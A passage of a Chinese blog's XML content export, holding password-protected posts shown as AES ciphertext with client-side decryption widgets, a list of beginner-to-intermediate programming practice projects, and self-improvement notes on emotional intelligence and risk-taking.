7+vXB4za1Ll5XsnyQIETDPUm8FRHzrb8LdBnsW+xi2uEOfdGeqhgMDkNYBoNcrujJO8Z7VoE6EjJp+gi1vK4i3i/5sHBTwR2whd3EBEbZhK4+/0ihKVJdd0se5B8y5S+RQyIu7y8nASfXJg9y31g5C2mnrCDMYuowcG4suAucD+8HNOE9SrEP7hlxObeMVjECX7qrQ04BUc93rxXt8QVbkNVG72fNdu5zP8NUilkAUvtIs0lEQoaaJE/ECA6Tcazm38rkfOe3uKn/wSLy2Xuiq0v2DHe2t+SXzvjGGq8h0u2UE3fkanfEmibgSGQQFHnJBBIjyv5lwQoqkprmrD5ssguSIOs+N25fA977GyeKbZHOA8hpk4fpDF2hr4oX6apQzrCh0CwGyinlh28csf70QU7F5izciJ+oleO6962JviHFrhusQaEtiOWFqvAATHXH18gXgiqy0q+BXu3+ntg6KzkceEhyzNqIFwe+iDHKqZiVqCedyY/BesnZBqQR9LUhggZL6/48dTJaxX7COM7dYAyzFAP3IxQAXHXFG6FnFoLX9yX3Ivhgj5eqqtb30eGr2Xl+24fvp17FalT5ebXuoG7yK06+LuRkIipgIsveOy5DsIV9tSF7UE3hjzRoOio9dbLXC4dmxhDlfo9YE5g8wMng4U0tqLMEUCvHG0/N/OicYo/k++lCQuXF/hYwBvm4ALkE71re2YQusV7zkG9sE3I2JOOzmy4JUBDpaH5a+E/tXxGMh2bgtz2eV5pcy8dtCqojW+yILmc8cRMiB7t5bul8/Q2+qeDVZfbWzKWFzI4D/VEjGVkhDEfrpQ7BAcZMPYslHN9HCJI89dPhO9pbmW2cmV21Ws9ubqcKEXmehcVZXz2b038yoAkjqOqooGmPZV468ZkY3N3keUBJQ5OluP3sOPvEMKlZRsJnssX92omxa33wTzmLctcbszFg/YgPF1oN5wfMei54DJQUXAF9Ryh8SkHiiO/hA4/af1BOXCMQFNlQi8tG7MNF/ywbqjJzDpzdQH1Gi77LiI2c2zYkZp4BX3dCFg/2qrbZ6QQPKe40MQBdAkFYxyE1iqy5cO1Jy5vwPB3SUGMmS2aOMGukQPImUTpMdHL5PHvdSwL5mJfww9zJ8MrA/JXmXrUI/fBduxplTFzud3l23pXY601CqYke+aODB1vNgZlWoKjR1hLfRnEsui0HFrIvJiZJ5ZGDD6ReMmuDOuiBnSru/uT7/7o00NaElvGbXYePN/5Y= </div>]]></content>
      <categories>
        <category>思考</category>
      </categories>
      <tags>
        <tag>思考</tag>
      </tags>
  </entry>
  <entry>
    <title>就想记录下这一天</title>
    <url>/%E5%B0%B1%E6%83%B3%E8%AE%B0%E5%BD%95%E4%B8%8B%E8%BF%99%E4%B8%80%E5%A4%A9/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">请输入访问密匙</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div>]]></content>
      <categories>
        <category>思考</category>
      </categories>
      <tags>
        <tag>思考</tag>
      </tags>
  </entry>
  <entry>
    <title>左耳朵大叔推荐的实战项目</title>
    <url>/%E5%B7%A6%E8%80%B3%E6%9C%B5%E5%A4%A7%E5%8F%94%E6%8E%A8%E8%8D%90%E7%9A%84%E5%AE%9E%E6%88%98%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<h4 id="程序员练级攻略（2018）"><a href="#程序员练级攻略（2018）" class="headerlink" title="程序员练级攻略（2018）"></a>程序员练级攻略（2018）</h4><h5 id="实践项目一"><a href="#实践项目一" class="headerlink" title="实践项目一"></a>实践项目一</h5><p>无论你用Python，还是Node.js，还是PHP，我希望你能做一个非常简单的Blog系统，或是BBS系统，需要支持如下功能：</p>
<ul>
<li>用户登录和注册（不需密码找回）。</li>
<li>用户发贴（不需要支持富文本，只需要支持纯文本）。</li>
<li>用户评论（不需要支持富文本，只需要支持纯文本）。</li>
<li>你需要从前端一直做到后端，也就是说，从HTML/CSS/JavaScript，到后面的PHP（Python/Node.js），再到数据库。这其中需要你查阅很多的知识。</li>
</ul>
<p><strong>这里有几个技术点你需要关注一下</strong></p>
<ul>
<li>用户登录时的密码不应该保存为明文，应该用MD5+Salt来保存（关于这个是什么，希望你能自行Google）.</li>
<li>用户登录后，对于用户自己的贴子可以有 “重新编辑” 或 “删除” 的功能，但是无权编辑或删除其它用户的贴子。</li>
<li><p>数据库的设计，你需要三张表：用户表、文章表和评论表，它们之间是怎么关联的，你需要学习一下。- 这里有个PHP的blog教你怎么建表，你可以 前往一读。</p>
<a id="more"></a>
<p><strong>如果你有兴趣，你可以顺着这个小项目，研究一下下面这几个事：</strong></p>
</li>
<li><p>图片验证码。</p>
</li>
<li>上传图片。</li>
<li>阻止用户在发文章或评论时输入带HTML或JavaScript的内容。</li>
<li>防范SQL注入。参看 <a href="http://php.net/manual/zh/security.database.sql-injection.php" target="_blank" rel="noopener">PHP官方文档</a> 或 <a href="https://technet.microsoft.com/zh-cn/library/ms161953%28v=sql.105%29.aspx?f=255&amp;MSPPError=-2147217396" target="_blank" rel="noopener">微软官方文档</a> ，或者你自己Google一下。</li>
</ul>
<p>上面这些东西，不是什么高深的东西，但是可以让你从中学到很多东西。相信你只需要自己Google一下就能搞定。</p>
<h5 id="实践项目二"><a href="#实践项目二" class="headerlink" title="实践项目二"></a>实践项目二</h5><p>这回我们需要设计一个投票系统的项目。</p>
<p><strong>业务上的需求如下：</strong></p>
<ul>
<li>用户只有在登录后，才可以生成投票表单。</li>
<li>投票项可以单选，可以多选。</li>
<li>其它用户投票后显示当前投票结果（但是不能刷票）。</li>
<li>投票有相应的时间，页面上需要出现倒计时。</li>
<li>投票结果需要用不同颜色不同长度的横条，并显示百分比和人数。</li>
</ul>
<p><strong>技术上的需求如下：</strong></p>
<ul>
<li>这回要用Java Spring Boot来实现了，然后，后端不返回任何的HTML，只返回JSon数据给前端。</li>
<li>由前端的JQuery来处理并操作相关的HTML动态生成在前端展示的页面。</li>
<li>前端的页面还要是响应式的，也就是可以在手机端和电脑端有不同的呈现。 这个可以用Bootstrap来完成。</li>
</ul>
<p><strong>如果你有兴趣，还可以挑战以下这些功能：</strong></p>
<ul>
<li>在微信中，通过微信授权后记录用户信息，以防止刷票。</li>
<li>可以不用刷页面，就可以动态地看到投票结果的变化。</li>
<li>Google一些画图表的JavaScript库，然后把图片表得风骚一些。</li>
</ul>
<h5 id="实践项目三"><a href="#实践项目三" class="headerlink" title="实践项目三"></a>实践项目三</h5><p>我们已经学习完了编程语言、理论学科和系统知识三部分内容，下面就来做几个实践项目，小试牛刀一下。实现语言可以用C、C++或Java。</p>
<p><strong>实现一个telnet版本的聊天服务器，主要有以下需求。</strong></p>
<ul>
<li>每个客户端可以用使用telnet ip:port的方式连接到服务器上。</li>
<li>新连接需要用用户名和密码登录，如果没有，则需要注册一个。</li>
<li>然后可以选择一个聊天室加入聊天。</li>
<li>管理员有权创建或删除聊天室，普通人员只有加入、退出、查询聊天室的权力。</li>
<li>聊天室需要有人数限制，每个人发出来的话，其它所有的人都要能看得到。</li>
</ul>
<p><strong>实现一个简单的HTTP服务器，主要有以下需求。</strong></p>
<ul>
<li>解释浏览器传来的HTTP协议，只需要处理URL path。</li>
<li>然后把所代理的目录列出来。</li>
<li>在浏览器上可以浏览目录里的文件和下级目录。</li>
<li>如果点击文件，则把文件打开传给浏览器（浏览器能够自动显示图片、PDF，或HTML、CSS、JavaScript以及文本文件）。</li>
<li>如果点击子目录，则进入到子目录中，并把子目录中的文件列出来。</li>
</ul>
<p><strong>实现一个生产者/消费者消息队列服务，主要有以下需求。</strong></p>
<ul>
<li>消息队列采用一个Ring-buffer的数据结构。</li>
<li>可以有多个topic供生产者写入消息及消费者取出消息。</li>
<li>需要支持多个生产者并发写。</li>
<li>需要支持多个消费者消费消息（只要有一个消费者成功处理消息就可以删除消息）。</li>
<li>消息队列要做到不丢数据（要把消息持久化下来）。</li>
<li>能做到性能很高。</li>
</ul>
]]></content>
      <categories>
        <category>左耳朵耗子</category>
      </categories>
      <tags>
        <tag>实战项目</tag>
        <tag>左耳朵耗子</tag>
      </tags>
  </entry>
  <entry>
    <title>帅张一期星球精华：笔记</title>
    <url>/%E5%B8%85%E5%BC%A0%E4%B8%80%E6%9C%9F%E6%98%9F%E7%90%83%E7%B2%BE%E5%8D%8E%EF%BC%9A%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="1、谈一谈情商"><a href="#1、谈一谈情商" class="headerlink" title="1、谈一谈情商"></a>1、谈一谈情商</h3><p>情商的重要性不言而喻，但什么是真正的情商？</p>
<p>在张哥看来，一个人的情商低主要表现在是3个方面：自我认识、自我控制、自我激励。</p>
<h4 id="自我认知"><a href="#自我认知" class="headerlink" title="自我认知"></a>自我认知</h4><p>认识自己，不要高估自己，低估别人。</p>
<p>看下自己是否具备自我认知的能力，是否为人处世愿意换位思考，除了自己明确的认识自己之外，也能从别人身上认知到自己的缺陷，发现别人身上的闪光点加以学习。<br><a id="more"></a></p>
<h4 id="自我控制"><a href="#自我控制" class="headerlink" title="自我控制"></a>自我控制</h4><p>高情商的人懂得自我控制。学习累了，娱乐，但是娱乐归娱乐。说不想一直娱乐那是假的，但是他懂得控制。</p>
<p>高情商的人在不顺心的时候，总会遇到让自己崩溃的人或事，但是高情商的人是会控制自己的情绪的，不会因为不顺心的事而打乱自己的节奏，影响自己的工作与生活。</p>
<p>有一些人你会觉得他做事很靠谱，做任何一件事都很难轻易放弃。有些人原则性很强,该做的会去做的，不该做的一定不会去做。</p>
<h4 id="自我激励"><a href="#自我激励" class="headerlink" title="自我激励"></a>自我激励</h4><p>总有一些人过了一段时间之后，她还是能一如既往的努力着、坚持着，那些比较优秀的人，以及你的老板们，你没有想过你的老板们经常激励你们但是谁来激励你的老板？答案就是：自我激励！</p>
<p>自我激励的方式有很多：赚更多的钱、改变世界、亦或者是改变自己的自由梦？</p>
<p>情商的高低也影响着你之后的爱情、事业、以及生活。这也是为什么不用在意之前怎么样之后你会怎么样才是最重要的。</p>
<h5 id="能享受最好的，但是同时也能承受最差的，才是最难的可贵的。"><a href="#能享受最好的，但是同时也能承受最差的，才是最难的可贵的。" class="headerlink" title="能享受最好的，但是同时也能承受最差的，才是最难的可贵的。"></a>能享受最好的，但是同时也能承受最差的，才是最难的可贵的。</h5><h3 id="2、谈认知与知识"><a href="#2、谈认知与知识" class="headerlink" title="2、谈认知与知识"></a>2、谈认知与知识</h3><p>你想成为什么样的人，那就尽量与他们靠近。你跟别没靠近，并不会对你产生职业上多少帮助。一些交流、思维、影响会逐渐感染的，你的认知也会逐渐受到提升。</p>
<p>贫穷可以限制你的想象力，但他并不是你谈判的资本。</p>
<p>王健林曾经说过这么一句话：清华北大，不如胆子大。虽然不太恰当但是反应了，敢于冒险是每个成功人士必备的特质。现实中你在抱怨自己没有遇上风口，没有生在马云那个时代，但是我要告诉你的是时代的风口，每年都有，但是等到机会成真正到来的时候，大部分人都会畏畏缩缩，没有几个人能真正去干。</p>
<p>现实中的绝大部分人做任何事总想着没有风险最好是零风险，然而殊不知，零风险也就意味着没有什么价值。这个世界上的回报总是伴随着风险的。风险越大，可能得到的回报越高，无数创业者所承受的风险是巨大的，然后正因为风险很大，一旦成功，得到的回报也是巨大的。这也是为什么即使创业失败的越来越多，但是依然不缺乏后来有新的创业者。</p>
<p>如果你想安安静静的做个普通人，上班族，那么你只需要努力就够了，但是如果你想要更大的成就，想从一个穷人阶级向更好的阶级跨越，努力是远远不够的，你一定需要具备冒险精神，然后在时代的变革中抓住机会，放手一搏，你才能有机会翻身，跨越阶级享受更好的资源。</p>
<p>即使是需要冒险，需要去博，也要给自己留条后路，要明白自己是不是输得起？</p>
<p>不同的人不同的性格，向往不同的生活没有对错，只是选择而已。但是不管你选择哪种生活，你们都必须具备一定的冒险精神，了解自己的风险承受能力，这样你才能因此获得更好的回报，甚至过上你从没有想过的生活。</p>
<p>不可否认，努力固然重要，但是如果只是单纯努力的话，我相信这世界上努力的人随处可见，这世界从来不缺乏努力的人，但是如果能在这一群努力的人中间脱颖而出，这才是一个关键点。</p>
<h5 id="提高自己的起点"><a href="#提高自己的起点" class="headerlink" title="提高自己的起点"></a>提高自己的起点</h5><p>起步晚但是可以提高自己的起点！此起点并非彼起点！</p>
<h5 id="保持专注"><a href="#保持专注" class="headerlink" title="保持专注"></a>保持专注</h5><p>做好你现在在做的事！</p>
<h5 id="把事情做到极致"><a href="#把事情做到极致" class="headerlink" title="把事情做到极致"></a>把事情做到极致</h5><p>尽量把一些事情做到极致，这样才能因此得到更多的信任与机会。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>心路历程</title>
    <url>/%E5%BF%83%E8%B7%AF%E5%8E%86%E7%A8%8B/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">请输入访问密匙（提示：一个备注名）</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX1+z2CizyrpQqye/Uc6OJDo+YHHNt4+mEPoOzonN4eZwJcVQAMWGyaCtPWRilgPpFQJPw0nBuGwks7YPjcWfbFD5uCADivIdKYukEM4Bc4B2MDeqjkSYCP+nH3Kjz/SF4jYmQh5snsG1qSt1dBIskvlim2qxTBE3U8Dv6bHNZiv2sSt7wDM/CPRtQ2hOYq4FVIog6QGPdkv+3teyAKUxI/jPHR4B2wmWL82bKbWh1uPzfqWXLEWUGj8AphuTlPkhJ9zOzI/1sB+N1OTvCRMMEVgsxBJOmq8E7k5ml6zW2F8ZOr41hXIUSDP9jvfTpmYJUfHEXCIdIMzy7dasZ+eMUTkjEMlo4h6bWO4zDOmTxWbcrylyHjDu3VI1eSzCPWDgbQ3tPKL2jB6F4unKYhDwO5aRF11UmsgeXX5FzsnWMYriKb7h4iH9NV0OgMYp9qMUI10PEsN5qoayeebhAOMK+BZOly7cTnGgJb2o0R5mDZ1IrUSM3/hyNeXuy3+uzSNkRPpjtCD5ieWZ9+f72vwPnd11BzgkRO9JiEJPvJylKmRNA2OLfklSAmHF/7pe4FutHkzaNgG8IQo+yICxYoYas1cZoChGGxKfrlwEeKuIRKqLao37iMw7Ie42dpI50YaK+q6zM/9TJkp7JAnzA2RpQnEDliAK5WqBZjpnQ3hPC4NheMA5/bK/oxDl77eWzQUcsIn4hlJSrqqZAj1FzRfi4k4zgmfCwqqOIl6A5huPHAf8n5I8GpXDlTWVdC8VKJGZP5ejism5TVaoVpLFmtizdjmOXzEnsf1UR6lqfICm/VHl8Q4OqWBXpUv1JTUGqhGNKjuh1J1Qktg19wfqZ9Ar/hwqOnGrDuDQZY1aZ9PAiaGi8c4aRvpv4wQ6ApkF7dWRg59YpCoPuq0f619WTIDSAkV8d7tT3kYtfCgyerQT7ga4DZTl0HZm7xQTQ5aqdpodeULH7TjPrI+K2ABXiqVaJepQz/DNAF7TVqwEkzuxG/3Ia9L3Q5eVWLEFneW4wXWTbsVu72F6BGpIvihO4P3g8wnvRXdPw8brc8HIfeOm5jzDkGK75lKTfy6/92E